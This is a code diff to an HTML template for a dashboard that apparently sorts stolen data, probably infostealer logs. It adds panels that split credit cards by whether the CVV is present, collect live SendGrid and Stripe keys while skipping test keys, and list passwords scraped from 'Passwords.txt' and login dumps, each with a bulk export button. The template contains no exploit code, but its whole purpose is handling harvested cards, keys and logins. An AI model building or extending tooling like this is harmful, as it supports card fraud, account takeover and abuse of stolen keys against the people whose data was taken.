@@ -21,7 +21,8 @@
       <a class="rail-btn" href="#logs" data-label="Output logs" aria-label="Output logs">▤</a>
       <a class="rail-btn" href="#credentials" data-label="Credentials" aria-label="Credentials">◇</a>
       <a class="rail-btn" href="#credit-cards" data-label="Credit cards" aria-label="Credit cards">💳</a>
-      <a class="rail-btn" href="#file-passwords" data-label="Passwords" aria-label="Passwords">🔑</a>
+      <a class="rail-btn" href="#api-keys" data-label="API keys" aria-label="API keys">🔑</a>
+      <a class="rail-btn" href="#file-passwords" data-label="Passwords" aria-label="Passwords">⌥</a>
     </nav>
     <div class="rail-bottom">
       <button class="rail-btn" type="button" data-settings-toggle data-label="Settings" aria-label="Settings" aria-controls="settings-menu" aria-expanded="false">⚙</button>
@@ -348,15 +349,76 @@
 
       <section class="panel credentials-panel" id="credit-cards">
         <div class="panel-head">
-          <div><p class="kicker">05 / Extracted</p><h2>Credit cards</h2><p class="panel-note">Format: cardnum|month|year|cvv — full values shown.</p></div>
+          <div><p class="kicker">05 / Extracted</p><h2>Credit cards</h2><p class="panel-note">Split by CVV availability. Dashboard shows the most recent 1,000 per section; exports download the full set.</p></div>
           <span class="head-icon" aria-hidden="true">💳</span>
         </div>
-        <div class="credentials-container"><div id="credit-cards-list" class="credentials-list"><div class="empty">No credit cards yet.</div></div></div>
-        <div class="credentials-actions">
-          <a class="button-link ghost is-disabled" href="/credit-cards/export" id="credit-cards-export-btn" aria-disabled="true" tabindex="-1">Export</a>
+
+        <div class="credit-cards-split">
+          <div class="credit-cards-column">
+            <div class="credit-cards-column-head">
+              <h3>With CVV</h3>
+              <p class="panel-note">Format: cardnum|month|year|cvv</p>
+            </div>
+            <div class="credentials-container"><div id="credit-cards-with-cvv-list" class="credentials-list"><div class="empty">No cards with CVV yet.</div></div></div>
+            <div class="credentials-actions">
+              <a class="button-link ghost is-disabled" href="/credit-cards/export-with-cvv" id="credit-cards-with-cvv-export-btn" aria-disabled="true" tabindex="-1">Export with CVV</a>
+            </div>
+          </div>
+
+          <div class="credit-cards-column">
+            <div class="credit-cards-column-head">
+              <h3>Without CVV</h3>
+              <p class="panel-note">Format: cardnum|month|year</p>
+            </div>
+            <div class="credentials-container"><div id="credit-cards-without-cvv-list" class="credentials-list"><div class="empty">No cards without CVV yet.</div></div></div>
+            <div class="credentials-actions">
+              <a class="button-link ghost is-disabled" href="/credit-cards/export-without-cvv" id="credit-cards-without-cvv-export-btn" aria-disabled="true" tabindex="-1">Export without CVV</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="credentials-actions credit-cards-clear-row">
           <form method="post" action="/credit-cards/clear-all" data-confirm="Delete ALL credit cards?">
             <input type="hidden" name="csrf" value="{{ csrf }}">
-            <button class="danger" type="submit" id="credit-cards-clear-btn" disabled>Clear credit cards</button>
+            <button class="danger" type="submit" id="credit-cards-clear-btn" disabled>Clear all credit cards</button>
+          </form>
+        </div>
+      </section>
+
+      <section class="panel credentials-panel" id="api-keys">
+        <div class="panel-head">
+          <div><p class="kicker">06 / Extracted</p><h2>SendGrid &amp; Stripe</h2><p class="panel-note">SendGrid and Stripe keys from Passwords.txt and API/key/token files. Dashboard shows the most recent 1,000 per section; exports download the full set.</p></div>
+          <span class="head-icon" aria-hidden="true">🔑</span>
+        </div>
+
+        <div class="credit-cards-split">
+          <div class="credit-cards-column">
+            <div class="credit-cards-column-head">
+              <h3>SendGrid</h3>
+              <p class="panel-note">Format: one SG.… key per line</p>
+            </div>
+            <div class="credentials-container"><div id="api-keys-sendgrid-list" class="credentials-list"><div class="empty">No SendGrid keys yet.</div></div></div>
+            <div class="credentials-actions">
+              <a class="button-link ghost is-disabled" href="/api-keys/export-sendgrid" id="api-keys-sendgrid-export-btn" aria-disabled="true" tabindex="-1">Export SendGrid</a>
+            </div>
+          </div>
+
+          <div class="credit-cards-column">
+            <div class="credit-cards-column-head">
+              <h3>Stripe</h3>
+              <p class="panel-note">sk_live and rk_live keys only (sk_test skipped)</p>
+            </div>
+            <div class="credentials-container"><div id="api-keys-stripe-list" class="credentials-list"><div class="empty">No Stripe keys yet.</div></div></div>
+            <div class="credentials-actions">
+              <a class="button-link ghost is-disabled" href="/api-keys/export-stripe" id="api-keys-stripe-export-btn" aria-disabled="true" tabindex="-1">Export Stripe</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="credentials-actions credit-cards-clear-row">
+          <form method="post" action="/api-keys/clear-all" data-confirm="Delete ALL SendGrid and Stripe keys?">
+            <input type="hidden" name="csrf" value="{{ csrf }}">
+            <button class="danger" type="submit" id="api-keys-clear-btn" disabled>Clear all API keys</button>
           </form>
         </div>
       </section>
@@ -364,7 +426,7 @@
       <section class="panel credentials-panel" id="file-passwords">
         <div class="panel-head">
           <div>
-            <p class="kicker">06 / Extracted</p>
+            <p class="kicker">07 / Extracted</p>
             <h2>Passwords</h2>
             <p class="panel-note">Scraped from Passwords.txt, login dumps, and labeled text files. Format: url|username|password. Dashboard shows the most recent 1,000; export downloads the full set.</p>
           </div>
